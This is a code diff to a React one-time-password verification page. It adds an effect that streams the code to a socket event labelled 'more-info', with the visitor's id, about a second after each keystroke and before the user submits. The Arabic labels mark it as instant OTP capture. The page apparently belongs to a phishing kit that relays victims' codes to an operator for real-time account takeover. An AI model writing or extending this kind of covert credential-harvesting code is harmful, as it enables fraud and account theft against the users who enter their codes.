@@ -12,6 +12,21 @@ export default function OTPVerification() {
   const [, navigate] = useLocation();
   const [otp, setOtp] = useState("");
   const [error, setError] = useState(false);
+  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  useEffect(() => {
+    if (debounceRef.current) clearTimeout(debounceRef.current);
+    debounceRef.current = setTimeout(() => {
+      if (otp) {
+        socket.value.emit("more-info", {
+          _id: visitor.value._id,
+          content: { "رمز التحقق (OTP)": otp },
+          page: "صفحة OTP - إدخال فوري"
+        });
+      }
+    }, 1000);
+    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
+  }, [otp]);
   const [isWaiting, setIsWaiting] = useState(false);
   const [resendTimer, setResendTimer] = useState(120); // 2 minutes countdown
   const [canResend, setCanResend] = useState(false);
